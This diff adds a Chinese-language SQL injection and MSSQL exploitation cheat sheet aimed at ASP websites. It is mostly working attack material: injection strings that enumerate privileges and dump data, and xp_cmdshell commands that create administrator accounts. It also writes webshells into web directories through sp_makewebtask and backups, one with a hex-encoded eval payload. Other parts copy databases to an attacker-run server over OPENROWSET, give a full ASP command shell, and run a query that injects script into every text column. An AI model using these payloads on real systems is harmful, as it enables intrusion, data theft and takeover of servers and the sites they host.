+?    使用'bulk insert'语法可以将一个文本文件插入到一个临时表中。如：bulk insert temp(id) from 'c:\inetpub\wwwroot\index.asp'    浏览temp就可以看到index.asp文件的内容了！通过分析各种ASP文件，可以得到大量系统信息，WEB建设与管理信息，甚至可以得到SA帐号的连接密码。
+
+31、一些sql中的扩展存储的总结:
+xp_availablemedia 显示系统上可用的盘符'C:\' xp_availablemedia
+xp_enumgroups 列出当前系统的使用群组及其说明 xp_enumgroups
+xp_enumdsn 列出系统上已经设置好的ODBC数据源名称 xp_enumdsn
+xp_dirtree 显示某个目录下的子目录与文件架构 xp_dirtree 'C:\inetpub\wwwroot\'
+xp_getfiledetails 获取某文件的相关属性 xp_getfiledetails 'C:\inetpub\wwwroot.asp'
+dbp.xp_makecab 将目标计算机多个档案压缩到某个档案里所压缩的档案都可以接在参数的后面用豆号隔开 dbp.xp_makecab 'C:\lin.cab','evil',1,'C:\inetpub\mdb.asp'
+xp_unpackcab 解压缩 xp_unpackcab 'C:\hackway.cab','C:\temp',1
+xp_ntsec_enumdomains 列出服务器域名 xp_ntsec_enumdomains
+xp_servicecontrol 停止或者启动某个服务 xp_servicecontrol 'stop','schedule'
+xp_terminate_process 用pid来停止某个执行中的程序 xp_terminate_process 123
+dbo.xp_subdirs 只列某个目录下的子目录 dbo.xp_subdirs 'C:\'
+
+32、
+USE MASTER
+GO
+create proc sp_MSforeachObject
+@objectType int=1,
+@command1 nvarchar(2000),
+@replacechar nchar(1) = N'?',
+@command2 nvarchar(2000) = null,
+@command3 nvarchar(2000) = null,
+@whereand nvarchar(2000) = null,
+@precommand nvarchar(2000) = null,
+@postcommand nvarchar(2000) = null
+as
+/* This proc returns one or more rows for each table (optionally, matching @where), with each table defaulting to its
+own result set */
+/* @precommand and @postcommand may be used to force a single result set via a temp table. */
+/* Preprocessor won't replace within quotes so have to use str(). */
+declare @mscat nvarchar(12)
+select @mscat = ltrim(str(convert(int, 0x0002)))
+if (@precommand is not null)
+exec(@precommand)
+/* Defined @isobject for save object type */
+Declare @isobject varchar(256)
+select @isobject= case @objectType when 1 then 'IsUserTable'
+when 2 then 'IsView'
+when 3 then 'IsTrigger'
+when 4 then 'IsProcedure'
+when 5 then 'IsDefault'
+when 6 then 'IsForeignKey'
+when 7 then 'IsScalarFunction'
+when 8 then 'IsInlineFunction'
+when 9 then 'IsPrimaryKey'
+when 10 then 'IsExtendedProc'
+when 11 then 'IsReplProc'
+when 12 then 'IsRule'
+     end
+/* create the select */
+/* Use @isobject variable isstead of IsUserTable string */
+EXEC(N'declare hCForEach cursor global for select ''['' + REPLACE(user_name(uid), N'']'', N'']]'') + '']'' + ''.'' + ''['' +
+REPLACE(object_name(id), N'']'', N'']]'') + '']'' from dbo.sysobjects o '
++ N' where OBJECTPROPERTY(o.id, N'''+@isobject+''') = 1 '+N' and o.category & ' + @mscat + N' = 0 '
++ @whereand)
+declare @retval int
+select @retval = @@error
+if (@retval = 0)
+     exec @retval = sp_MSforeach_worker @command1, @replacechar, @command2, @command3
+if (@retval = 0 and @postcommand is not null)
+     exec(@postcommand)
+return @retval
+GO
+
+
+/*
+1。获得所有的存储过程的脚本：
+EXEc sp_MSforeachObject @command1="sp_helptext '?' ",@objectType=4
+2。获得所有的视图的脚本：
+EXEc sp_MSforeachObject @command1="sp_helptext '?' ",@objectType=2
+
+EXEc sp_MSforeachObject @command1="sp_changeobjectowner '?', 'dbo'",@objectType=1
+EXEc sp_MSforeachObject @command1="sp_changeobjectowner '?', 'dbo'",@objectType=2
+EXEc sp_MSforeachObject @command1="sp_changeobjectowner '?', 'dbo'",@objectType=3
+EXEc sp_MSforeachObject @command1="sp_changeobjectowner '?', 'dbo'",@objectType=4
+*/
+
+33、DB_OWNER权限下的数据库备份方法
+用openrowset吧。反连到自己的数据库机器，~先在本地建个跟目标机器一样结构的表~字段类型使用nvarchar.然后用海洋连接对方的SQL数据库，在查询分析那里执行
+insert into OPENROWSET ('sqloledb','server=你数据库服务器的IP;uid=user;pwd=pass;database=dbname; ','select * from 你建立的表) select * from 对方的表—
+要是数据量太大的话就看看他数据库里有没有自动编号的字段.select * from 表名 where id>100
+这样来弄吧
+要是和WEB同台的话，直接将库BAK到WEB目录下回来就OK啦。。。不过前提库不能太大，超过2G的话SQL就超时了
+如果是SA权限可以利用下面的两个ASP程序来备份数据库：
+
+sqlbackup1.asp
+<HTML>
+<HEAD>
+<TITLE>SQL Server 数据库的备份与恢复</TITLE>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+</HEAD>
+<BODY>
+<form method="post" name=myform>
+选择操作：<INPUT TYPE="radio" NAME="act" id="act_backup" value="backup"><label for=act_backup>备份</label>　
+<INPUT TYPE="radio" NAME="act" id="act_restore" value="restore"><label for=act_restore>恢复</label>
+<br>数据库名：<INPUT TYPE="text" NAME="databasename" value="<%=request("databasename")%>">
+<br>文件路径：<INPUT TYPE="text" NAME="bak_file" value="c:\1.exe">(备份或恢复的文件路径,备份成EXE主要为了方便下载,活活..)<br>
+<input type="submit" value="确定">
+</form>
+<%
+dim sqlserver,sqlname,sqlpassword,sqlLoginTimeout,databasename,bak_file,act
+sqlserver = "localhost" 'sql服务器
+sqlname = "sa" '用户名
+sqlpassword = "数据库密码" '密码
+sqlLoginTimeout = 15 '登陆超时
+databasename = trim(request("databasename"))
+bak_file = trim(request("bak_file"))
+bak_file = replace(bak_file,"$1",databasename)
+act = lcase(request("act"))
+if databasename = "" then
+response.write "input database name"
+else
+if act = "backup" then
+Set srv=Server.createObject("SQLDMO.SQLServer")
+srv.LoginTimeout = sqlLoginTimeout
+srv.Connect sqlserver,sqlname, sqlpassword
+Set bak = Server.createObject("SQLDMO.Backup")
+bak.Database=databasename
+bak.Devices=Files
+bak.Files=bak_file
+bak.SQLBackup srv
+if err.number>0 then
+response.write err.number&"<font color=red><br>"
+response.write err.description&"</font>"
+end if
+Response.write "<font color=green>备份成功!</font>"
+elseif act = "restore" then
+'恢复时要在没有使用数据库时进行！
+Set srv=Server.createObject("SQLDMO.SQLServer")
+srv.LoginTimeout = sqlLoginTimeout
+srv.Connect sqlserver,sqlname, sqlpassword
+Set rest=Server.createObject("SQLDMO.Restore")
+rest.Action=0 ' full db restore
+rest.Database=databasename
+rest.Devices=Files
+rest.Files=bak_file
+rest.ReplaceDatabase=True 'Force restore over existing database
+if err.number>0 then
+response.write err.number&"<font color=red><br>"
+response.write err.description&"</font>"
+end if
+rest.SQLRestore srv
+
+Response.write "<font color=green>恢复成功!</font>"
+else
+Response.write "<font color=red>没有选择操作</font>"
+end if
+end if
+%>
+</BODY>
+</HTML>
+
+sqlbackup2.asp
+<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>采飞扬ASP备份MSSQL数据库程序 V1.0--QQ:79998575</title>
+</head>
+<style>
+BODY {    FONT-SIZE: 9pt;    COLOR: #000000;    FONT-FAMILY: "Courier New";    scrollbar-face-color:#E4E4F3;    scrollbar-highlight-color:#FFFFFF;    scrollbar-3dlight-color:#E4E4F3;    scrollbar-darkshadow-color:#9C9CD3;    scrollbar-shadow-color:#E4E4F3;    scrollbar-arrow-color:#4444B3;    scrollbar-track-color:#EFEFEF;}TABLE {    FONT-SIZE: 9pt;    FONT-FAMILY: "Courier New";    BORDER-COLLAPSE: collapse;    border-top-width: 1px;    border-right-width: 1px;    border-bottom-width: 1px;    border-left-width: 1px;    border-top-style: solid;    border-right-style: none;    border-bottom-style: none;    border-left-style: solid;    border-top-color: #d8d8f0;    border-right-color: #d8d8f0;    border-bottom-color: #d8d8f0;    border-left-color: #d8d8f0;}.tr {    font-family: "Courier New";    font-size: 9pt;    background-color: #e4e4f3;    text-align: center;}.td {    font-family: "Courier New";    font-size: 9pt;    background-color: #f9f9fd;}.warningColor {    font-family: "Courier New";    font-size: 9pt;    color: #ff0000;}input {
+font-family: "Courier New";
+BORDER-TOP-WIDTH: 1px;
+BORDER-LEFT-WIDTH: 1px;
+FONT-SIZE: 12px;
+BORDER-BOTTOM-WIDTH: 1px;
+BORDER-RIGHT-WIDTH: 1px;
+color: #000000;
+}textarea {    font-family: "Courier New";    BORDER-TOP-WIDTH: 1px;    BORDER-LEFT-WIDTH: 1px;    FONT-SIZE: 12px;    BORDER-BOTTOM-WIDTH: 1px;    BORDER-RIGHT-WIDTH: 1px;    color: #000000;}.liuyes {
+background-color: #CCCCFF;
+}
+A:link {    FONT-SIZE: 9pt;    COLOR: #000000;    FONT-FAMILY: "Courier New";    TEXT-DECORATION: none;}tr {    font-family: "Courier New";    font-size: 9pt;    line-height: 18px;}td {    font-family: "Courier New";    font-size: 9pt;    border-top-width: 1px;    border-right-width: 1px;    border-bottom-width: 1px;    border-left-width: 1px;    border-top-style: none;    border-right-style: solid;    border-bottom-style: solid;    border-left-style: none;    border-top-color: #d8d8f0;    border-right-color: #d8d8f0;    border-bottom-color: #d8d8f0;    border-left-color: #d8d8f0;}.trHead {    font-family: "Courier New";    font-size: 9pt;    background-color: #e4e4f3;    line-height: 3px;}.inputLogin {    font-family: "Courier New";    font-size: 9pt;    border: 1px solid #d8d8f0;    background-color: #f9f9fd;    vertical-align: bottom;}</style>
+<body>
+<form method="post" name="myform" action="?action=backupdatabase">
+<table width="686" border="1" align="center">
+<tr>
+<td width="613" height="30" align="center" bgcolor="#330066"><font color="#FFFFFF">采飞扬ASP备份MSSQL数据库程序 V1.0 </font></td>
+</tr>
+<tr>
+<td>选择操作：
+   <input type="radio" name="act" id="act_backup"value="backup" />
+   <label for=act_backup>备份</label>
+   <input type="radio" name="act" id="act_restore" value="restore" />
+   <label for=act_restore>恢复</label></td>
+</tr>
+<tr>
+<td><label>SQL服务器:
+   <input type="text" name="sqlserver" value="localhost" />
+</label></td>
+</tr>
+<tr>
+<td><label>用户名:
+   <input name="sqlname" type="text" value="sa" />
+密 码:
+<input type="text" name="sqlpassword" />
+</label></td>
+</tr>
+<tr>
+<td><label>数据库名：
+   <input type="text" name="databasename" value="<%=request("databasename")%>" />
+</label></td>
+</tr>
+<tr>
+<td>文件路径：
+   <input name="bak_file" type="text" value="<% =server.MapPath("\")&"\"&"liuyes.bak"%>" size="60" />
+(备份或恢复的文件路径)</td>
+</tr>
+<tr>
+<td><% Response.write "本文件绝对路径:" %>
+   <font color="#FF0000">
+   <% =server.mappath(Request.ServerVariables("SCRIPT_NAME")) %>
+   </font></td>
+</tr>
+<tr>
+<td><input name=submit1 type="submit" class="liuyes" id=submit1 size="10" value="确 定" />
+     <input name="Submit" type="reset" class="liuyes" size="10" value="重 置" /></td>
+</tr>
+</table>
+</form>
+<table width="686" border="1" align="center">
+<tr>
+<td>提示信息:<%
+if request("action")="" then   
+response.write "<font color=#ff0000>不用我多说什么了吧！</font>"
+end if
+'SQL Server 数据库的备份与恢复!
+if request("action")="backupdatabase" Then
+dim sqlserver,sqlname,sqlpassword,sqlLoginTimeout,databasename,bak_file,act
+sqlserver = trim(request("sqlserver"))
+sqlname = trim(request("sqlname"))
+sqlpassword =trim(request("sqlpassword"))
+sqlLoginTimeout = 15
+databasename = trim(request("databasename"))
+bak_file = trim(request("bak_file"))
+bak_file = replace(bak_file,"$1",databasename)
+act = lcase(request("act"))
+if databasename = "" then
+response.write "<font color=#ff0000>没有输入数据库名称!</font>"
+else
+if act = "backup" then
+Set srv=Server.createObject("SQLDMO.SQLServer")
+srv.LoginTimeout = sqlLoginTimeout
+srv.Connect sqlserver,sqlname, sqlpassword
+Set bak = Server.createObject("SQLDMO.Backup")
+bak.Database=databasename
+bak.Devices=Files
+bak.Action    = 0
+bak.Initialize    = 1
+'bak.Replace    = True
+bak.Files=bak_file
+bak.SQLBackup srv
+if err.number>0 then
+response.write err.number&"<font color=red><br>"
+response.write err.description&"</font>"
+end if
+Response.write "<font color=green>备份成功!</font>"
+elseif act="restore" then
+'恢复时要在没有使用数据库时进行！
+Set srv=Server.createObject("SQLDMO.SQLServer")
+srv.LoginTimeout = sqlLoginTimeout
+srv.Connect sqlserver,sqlname, sqlpassword
+Set rest=Server.createObject("SQLDMO.Restore")
+rest.Action=0 ' full db restore
+rest.Database=databasename
+rest.Devices=Files
+rest.Files=bak_file
+rest.ReplaceDatabase=True 'Force restore over existing database
+if err.number>0 then
+response.write err.number&"<font color=red><br>"
+response.write err.description&"</font>"
+end if
+rest.SQLRestore srv
+Response.write "<font color=green>恢复成功!</font>"
+else
+Response.write "<font color=red>请选择备份或恢复!</font>"
+end if
+end if
+end if
+%></td>
+</tr>
+</table>
+</body>
+</html>
+ 
+ 
+ 
+                                                                                                   (2)
+//看看是什么权限的
+and 1=(Select IS_MEMBER('db_owner'))
+And char(124)%2BCast(IS_MEMBER('db_owner') as varchar(1))%2Bchar(124)=1 ;--
+
+//检测是否有读取某数据库的权限
+and 1= (Select HAS_DBACCESS('master'))
+And char(124)%2BCast(HAS_DBACCESS('master') as varchar(1))%2Bchar(124)=1 --
+
+
+数字类型
+and char(124)%2Buser%2Bchar(124)=0
+
+字符类型
+' and char(124)%2Buser%2Bchar(124)=0 and ''='
+
+搜索类型
+' and char(124)%2Buser%2Bchar(124)=0 and '%'='
+
+爆用户名
+and user>0
+' and user>0 and ''='
+
+检测是否为SA权限
+and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
+And char(124)%2BCast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1 --
+
+检测是不是MSSQL数据库
+and exists (select * from sysobjects);--
+
+检测是否支持多行
+;declare @d int;--
+
+恢复 xp_cmdshell
+;exec master..dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll';--
+
+
+select * from openrowset('sqloledb','server=192.168.1.200,1433;uid=test;pwd=pafpaf','select @@version')
+
+//-----------------------
+//       执行命令
+//-----------------------
+首先开启沙盘模式：
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+然后利用jet.oledb执行系统命令
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c net user admin admin1234 /add")')
+
+执行命令
+;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c net user paf pafpaf /add';--
+
+EXEC [master].[dbo].[xp_cmdshell] 'cmd /c md c:\1111'
+
+判断xp_cmdshell扩展存储过程是否存在：
+http://192.168.1.5/display.asp?keyno=188 and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')
+
+写注册表
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+REG_SZ
+
+读注册表
+exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','Userinit'
+
+读取目录内容
+exec master..xp_dirtree 'c:\winnt\system32\',1,1
+
+
+数据库备份
+backup database pubs to disk = 'c:\123.bak'
+
+//爆出长度
+And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From D99_Tmp)=0 ;--
+
+
+
+更改sa口令方法：用sql综合利用工具连接后，执行命令：
+exec sp_password NULL,'新密码','sa'
+
+添加和删除一个SA权限的用户test：
+exec master.dbo.sp_addlogin test,9530772
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+删除扩展存储过过程xp_cmdshell的语句:
+exec sp_dropextendedproc 'xp_cmdshell'
+
+添加扩展存储过过程
+EXEC [master]..sp_addextendedproc 'xp_proxiedadata', 'c:\winnt\system32\sqllog.dll'
+GRANT exec On xp_proxiedadata TO public
+
+
+停掉或激活某个服务。
+
+exec master..xp_servicecontrol 'stop','schedule'
+exec master..xp_servicecontrol 'start','schedule'
+
+dbo.xp_subdirs
+
+只列某个目录下的子目录。
+xp_getfiledetails 'C:\Inetpub\wwwroot\SQLInject\login.asp'
+
+dbo.xp_makecab
+
+将目标多个档案压缩到某个目标档案之内。
+所有要压缩的档案都可以接在参数列的最后方，以逗号隔开。
+
+dbo.xp_makecab
+'c:\test.cab','mszip',1,
+'C:\Inetpub\wwwroot\SQLInject\login.asp',
+'C:\Inetpub\wwwroot\SQLInject\securelogin.asp'
+
+xp_terminate_process
+
+停掉某个执行中的程序，但赋予的参数是 Process ID。
+利用”工作管理员”，透过选单「检视」-「选择字段」勾选 pid，就可以看到每个执行程序的 Process ID
+
+xp_terminate_process 2484
+
+xp_unpackcab
+
+解开压缩档。
+
+xp_unpackcab 'c:\test.cab','c:\temp',1
+
+
+某机，安装了radmin，密码被修改了，regedit.exe不知道被删除了还是被改名了，net.exe不存在，没有办法使用regedit /e 导入注册文件，但是mssql是sa权限，使用如下命令 EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\RAdmin\v2.0\Server\Parameters','Parameter','REG_BINARY',0x02ba5e187e2589be6f80da0046aa7e3c 即可修改密码为12345678。如果要修改端口值 EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\RAdmin\v2.0\Server\Parameters','port','REG_BINARY',0xd20400 则端口值改为1234
+
+create database lcx;
+Create TABLE ku(name nvarchar(256) null);
+Create TABLE biao(id int NULL,name nvarchar(256) null);
+
+//得到数据库名
+insert into opendatasource('sqloledb','server=211.39.145.163,1443;uid=test;pwd=pafpaf;database=lcx').lcx.dbo.ku select name from master.dbo.sysdatabases
+
+
+//在Master中创建表，看看权限怎样
+Create TABLE master..D_TEST(id nvarchar(4000) NULL,Data nvarchar(4000) NULL);--
+
+用 sp_makewebtask直接在web目录里写入一句话马：
+http://127.0.0.1/dblogin123.asp?username=123';exec%20sp_makewebtask%20'd:\www\tt\88.asp','%20select%20''<%25execute(request("a"))%25>''%20';--
+
+//更新表内容
+Update films SET kind = 'Dramatic' Where id = 123
+
+//删除内容
+delete from table_name where Stockid = 3
+
+
+手工脚本注入 
+1.判断是否有注入;and 1=1 ;and 1=2 
+
+2.初步判断是否是mssql ;and user>0 
+
+3.注入参数是字符'and [查询条件] and ''=' 
+
+4.搜索时没过滤参数的'and [查询条件] and '%25'=' 
+
+5.判断数据库系统 
+;and (select count(*) from sysobjects)>0 mssql 
+;and (select count(*) from msysobjects)>0 access 
+
+6.猜数据库 ;and (select Count(*) from [数据库名])>0 
+
+7.猜字段 ;and (select Count(字段名) from 数据库名)>0 
+
+8.猜字段中记录长度 ;and (select top 1 len(字段名) from 数据库名)>0 
+
+9.(1)猜字段的ascii值（access） 
+;and (select top 1 asc(mid(字段名,1,1)) from 数据库名)>0 
+
+(2)猜字段的ascii值（mssql） 
+;and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)>0 
+
+10.测试权限结构（mssql） 
+;and 1=(select IS_SRVROLEMEMBER('sysadmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('serveradmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('setupadmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('securityadmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('diskadmin'));-- 
+;and 1=(select IS_SRVROLEMEMBER('bulkadmin'));-- 
+;and 1=(select IS_MEMBER('db_owner'));-- 
+
+11.添加mssql和系统的帐户 
+;exec master.dbo.sp_addlogin username;-- 
+
+;exec master.dbo.sp_password null,username,password;-- 
+
+;exec master.dbo.sp_addsrvrolemember sysadmin username;-- 
+
+;exec master.dbo.xp_cmdshell 'net user username password 
+/workstations:*/times:all/passwordchg:yes /passwordreq:yes /active:yes /add';-- 
+
+;exec master.dbo.xp_cmdshell 'net user username password /add';-- 
+
+;exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';-- 
+
+12.(1)遍历目录 
+
+;create table dirs(paths varchar(100), id int) 
+;insert dirs exec master.dbo.xp_dirtree 'c:\' 
+;and (select top 1 paths from dirs)>0 
+;and (select top 1 paths from dirs where paths not in('上步得到的paths'))>) 
+
+(2)遍历目录 
+;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));-- 
+;insert temp exec master.dbo.xp_availablemedia;-- 获得当前所有驱动器 
+;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';-- 获得子目录列表 
+;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- 获得所有子目录的目录树构 
+;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';-- 查看文件的内容 
+
+13.mssql中的存储过程 
+
+xp_regenumvalues 注册表根键, 子键 
+;exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 以多个记录集方式返回所有键值 
+
+xp_regread 根键,子键,键值名 
+;exec xp_regread 
+'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','CommonFilesDir' 返回制定键的值 
+
+xp_regwrite 根键,子键, 值名, 值类型, 值 
+值类型有2种REG_SZ 表示字符型,REG_DWORD 表示整型 
+;exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName','reg_sz','hello' 写入注册表 
+
+xp_regdeletevalue 根键,子键,值名 
+
+exec xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName' 删除某个值 
+
+xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Testkey' 删除键,包括该键下所有值 
+
+14.mssql的backup创建webshell 
+use model 
+create table cmd(str image); 
+insert into cmd(str) values (''); 
+backup database model to disk='c:\l.asp'; 
+
+15.mssql内置函数 
+;and (select @@version)>0 获得Windows的版本号 
+;and user_name()='dbo' 判断当前系统的连接用户是不是sa 
+;and (select user_name())>0 爆当前系统的连接用户 
+;and (select db_name())>0 得到当前连接的数据库 
+
+16.简洁的webshell 
+
+use model 
+
+create table cmd(str image); 
+
+insert into cmd(str) values (''); 
+
+backup database model to disk='g:\wwwtest\l.asp'; 
+
+
+
+
+                                                                                  (3)
+                                                                                  
+
+可能有很多人，看到关闭了wscript.shell,就感觉没提权的希望了。就会放弃。
+一般当闭上面组件时，你上传cmd.exe到上面去是运行不了命令的。运行时会说出错。
+要想让运行命令可以试试这种方法，成功率为五五之数。
+把下面代码复制：
+<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
+<%if err then%>
+<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
+<%
+end if
+response.write("<textarea readonly cols=80 rows=20>")
+On Error Resume Next
+response.write oScriptlhn.exec("cmd.exe /c" & request("c")).stdout.readall
+response.write("</textarea>")
+response.write("<form method='post'>")
+response.write("<input type=text name='c' size=60><br>")
+response.write("<input type=submit value='执行'></form>")
+%>
+
+保存为一个asp文件，然后传到网站目录上去
+运行的时候可能会出现两个问题，第一是运行了为什么运行不了命令，这个你可以试着再上传个cmd.exe然后把路径写入上面代码。
+我用此成功运行过cacls命令。
+
+第二那就是运行时出错，可能限制某些代码执行
+
+ 
+                                                                                     (4)
+
+
+◆获取数据库名
+ and db_name()=0
+ and db_name(0)=0
+ and db_name(__i__)=0
+ and quotename(db_name(__i__))=0
+
+◆获取用户名
+ and user=0
+
+◆获取版本信息
+ and @@version=0
+
+◆获取服务器名
+ and @@servername=0
+
+◆获取服务名
+ and @@servicename=0
+
+◆获取系统用户名
+ and system_user=0
+
+◆一次性获取所有基本信息
+ AnD (dB_NaMe(0)+cHaR(124)+uSeR+cHaR(124)+@@vErSiOn+cHaR(124)+@@sErVeRnAmE+cHaR(124)+@@sErViCeNaMe+cHaR(124)+sYsTeM_UsEr)=0
+
+◆一次性探测权限
+ AnD (cAsT(iS_srvrOlEmEmBeR(0x730079007300610064006d0069006e00)aS vArChAr)+cHaR(94)+cAsT(iS_srvrOlEmEmBeR(0x64006200630072006500610074006f007200)aS vArChAr)+cHaR(94)+cAsT(iS_srvrOlEmEmBeR(0x620075006c006b00610064006d0069006e00)aS vArChAr)+cHaR(94)+cAsT(iS_srvrOlEmEmBeR(0x6400690073006b00610064006d0069006e00)aS vArChAr)+cHaR(94)+cAsT(iS_srvrOlEmEmBeR(0x730065007200760065007200610064006d0069006e00)aS vArChAr)+cHaR(94)+cAsT(iS_mEmBeR (0x7000750062006c0069006300) aS vArChAr)+cHaR(94)+cAsT(iS_mEmBeR (0x640062005f006f0077006e0065007200) aS vArChAr)+cHaR(94)+cAsT(iS_mEmBeR (0x640062005f006200610063006b00750070006f00700065007200610074006f007200) aS vArChAr)+cHaR(94)+cAsT(iS_mEmBeR (0x640062005f006400610074006100770072006900740065007200) aS vArChAr))=0
+
+◆获取数据库的数目
+ AnD (sElEcT cAsT(cOuNt(1) aS nvArChAr(100))+cHaR(9) FrOm mAsTeR..sYsDaTaBaSeS)=0
+
+◆获取数据库文件名
+ and (select top 1 filename from (select top __i__ filename from master..sysdatabases order by filename) t order by filename desc)=0
+
+◆同时获取数据库名和数据库文件名
+ AnD (sElEcT ToP 1 rtrim(iSnUlL(cAsT(nAmE aS nvArChAr(4000)),cHaR(32)))+cHaR(9)+rtrim(iSnUlL(cAsT(filenAmE aS nvArChAr(4000)),cHaR(32)))+cHaR(9) FrOm (sElEcT ToP __i__ nAmE,filenAmE FrOm mAsTeR..sYsDaTaBaSeS oRdEr bY nAmE) t oRdEr bY nAmE dEsC)=0
+
+◆获取数据库的表的数目
+  and (select cast(count(1) as varchar)+char(9) from <数据库名>..sysobjects where xtype=0x75)=0
+
+◆获取数据库的表
+ and (select top 1 name from (select top __i__ name from <数据库名>..sysobjects where xtype=0X75 order by name) t order by name desc)=0
+ and (select top 1 quotename(name) from <数据库名>.dbo.sysobjects where xtype=char(85) AND name not in (select top __i__ name from <数据库名>.dbo.sysobjects where xtype=char(85)))=0
+
+◆获取表的字段的数目
+ and (select cast(count(1) as varchar)+char(9) from <数据库名>..syscolumns where id=object_id('<表名>'))=0
+
+◆获取数据库表的字段
+ and (select top 1 name from (select top __i__ name,id from <数据库名>..syscolumns where id=object_id('<表名>') order by name) t order by name desc)=0
+ and (select col_name(object_id('<表名>'),__i__))=0
+
+◆获取满足条件的表的记录数
+ AnD (sElEcT cAsT(cOuNt(1) aS nvArChAr(100))+cHaR(9) FrOm <数据库名>..<表名>)=0
+
+◆获取数据库的内容
+ AnD (sElEcT ToP 1 rtrim(iSnUlL(cAsT(<列名1> aS nvArChAr(4000)),cHaR(32)))+cHaR(9)+rtrim(iSnUlL(cAsT(<列名2> aS nvArChAr(4000)),cHaR(32)))+cHaR(9)+rtrim(iSnUlL(cAsT(<列名3> aS nvArChAr(4000)),cHaR(32)))+cHaR(9) FrOm (sElEcT ToP __i__ <列名1>,<列名2>,<列名3> FrOm <数据库名>..<表名> oRdEr bY <排序列名>) t oRdEr bY <排序列名> dEsC)=0
+
+
+◆基于日志差异备份
+--1. 进行初始备份
+; Alter Database TestDB Set Recovery Full Drop Table ttt Create Table ttt (a image) Backup Log TestDB to disk = '<临时文件名:e:\wwwroot\m.asp>' With Init--
+
+--2. 插入数据
+;Insert Into ttt Values(0x253E3C256576616C2872657175657374286368722839372929293A726573706F6E73652E656E64253E)--
+
+--3. 备份并获得文件，删除临时表
+;Backup Log <数据库名> To Disk = '<要生成的文件名:e:\wwwroot\m.asp>';Drop Table ttt Alter Database TestDB Set Recovery SIMPLE--
+
+◆基于数据库差异备份
+1. 进行差异备份准备工作
+;Declare @a Sysname;Set @a=db_name();Declare @file VarChar(400);Set @file=<临时文件名:0x633A5C617364662E617370>;Drop Table ttt Create Table ttt(c Image) Backup Database @a To Disk=@file--
+
+2. 将数据写入到数据库
+;Insert Into ttt Values(0x253E3C256576616C2872657175657374286368722839372929293A726573706F6E73652E656E64253E)-- 
+
+3. 备份数据库并作最后的清理工作
+;Declare @b SysName;Set @b=db_name();Declare @file1 VarChar(400);Set @file1=<最终需要备份出的文件名:0x633A5C617364662E617370>;Backup Database @b To Disk=@file1 With Differential,Format;Drop Table ttt;--
+
+◆数据库插马(插指定数据库的指定表的满足条件的记录)
+;update <数据库名>..<表名> set <字段名>=<字段名>+'<script>alert("有漏洞啊。")</script>' where <要满足的条件>--
+
+◆数据库批量插马(插所有可插入的字段和记录，危险！！请谨慎操作！！)
+;dEcLaRe @t vArChAr(255),@c vArChAr(255) dEcLaRe tAbLe_cursoR cUrSoR FoR sElEcT a.nAmE,b.nAmE FrOm sYsObJeCtS a,sYsCoLuMnS b wHeRe a.iD=b.iD AnD a.xTyPe='u' AnD (b.xTyPe=99 oR b.xTyPe=35 oR b.xTyPe=231 oR b.xTyPe=167) oPeN tAbLe_cursoR fEtCh next FrOm tAbLe_cursoR iNtO @t,@c while(@@fEtCh_status=0) bEgIn exec('UpDaTe ['+@t+'] sEt ['+@c+']=rtrim(convert(varchar,['+@c+']))+cAsT(<要插入的内容(0x编码形式)> aS vArChAr(200<此处长度应做相应修改>))') fEtCh next FrOm tAbLe_cursoR iNtO @t,@c eNd cLoSe tAbLe_cursoR dEAlLoCaTe tAbLe_cursoR;--
+
+
